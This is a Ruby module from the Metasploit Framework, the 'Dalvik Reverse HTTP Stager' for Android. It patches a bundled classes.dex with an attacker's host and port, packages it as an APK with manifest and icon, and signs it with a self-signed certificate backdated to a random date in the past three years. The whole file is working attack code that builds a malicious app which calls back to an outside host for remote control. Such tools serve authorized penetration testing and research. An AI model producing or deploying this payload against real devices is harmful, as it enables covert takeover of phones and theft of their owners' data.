##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/reverse_http'

module Metasploit3

  include Msf::Payload::Stager
  include Msf::Payload::Dalvik

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Dalvik Reverse HTTP Stager',
      'Description'   => 'Tunnel communication over HTTP',
      'Author'        => 'anwarelmakrahy',
      'License'       => MSF_LICENSE,
      'Platform'      => 'android',
      'Arch'          => ARCH_DALVIK,
      'Handler'       => Msf::Handler::ReverseHttp,
      'Stager'        => {'Payload' => ""}
      ))

    register_options(
    [
      OptInt.new('RetryCount', [true, "Number of trials to be made if connection failed", 10])
    ], self.class)
  end 
  
  def string_sub(data, placeholder, input)
    data.gsub!(placeholder, input + ' ' * (placeholder.length - input.length))
  end
  
  def generate_jar(opts={})
    jar = Rex::Zip::Jar.new

    classes = File.read(File.join(Msf::Config::InstallRoot, 'data', 'android', 'apk', 'classes.dex'), {:mode => 'rb'})

    string_sub(classes, 'ZZZZ                                ', "ZZZZhttp://" + datastore['LHOST'].to_s) if datastore['LHOST']
    string_sub(classes, '4444                            ', datastore['LPORT'].to_s) if datastore['LPORT']
    string_sub(classes, 'TTTT                                ', "TTTT" + datastore['RetryCount'].to_s) if datastore['RetryCount']
    jar.add_file("classes.dex", fix_dex_header(classes))

    files = [
      [ "AndroidManifest.xml" ],
      [ "res", "drawable-mdpi", "icon.png" ],
      [ "res", "layout", "main.xml" ],
      [ "resources.arsc" ]
    ]

    jar.add_files(files, File.join(Msf::Config.install_root, "data", "android", "apk"))
    jar.build_manifest

    x509_name = OpenSSL::X509::Name.parse(
      "C=Unknown/ST=Unknown/L=Unknown/O=Unknown/OU=Unknown/CN=Unknown"
      )
    key  = OpenSSL::PKey::RSA.new(1024)
    cert = OpenSSL::X509::Certificate.new
    cert.version = 2
    cert.serial = 1
    cert.subject = x509_name
    cert.issuer = x509_name
    cert.public_key = key.public_key

    # Some time within the last 3 years
    cert.not_before = Time.now - rand(3600*24*365*3)

    # From http://developer.android.com/tools/publishing/app-signing.html
    # """
    # A validity period of more than 25 years is recommended.
    #
    # If you plan to publish your application(s) on Google Play, note
    # that a validity period ending after 22 October 2033 is a
    # requirement. You can not upload an application if it is signed
    # with a key whose validity expires before that date.
    # """
    cert.not_after = cert.not_before + 3600*24*365*20 # 20 years

    jar.sign(key, cert, [cert])

    jar
  end

end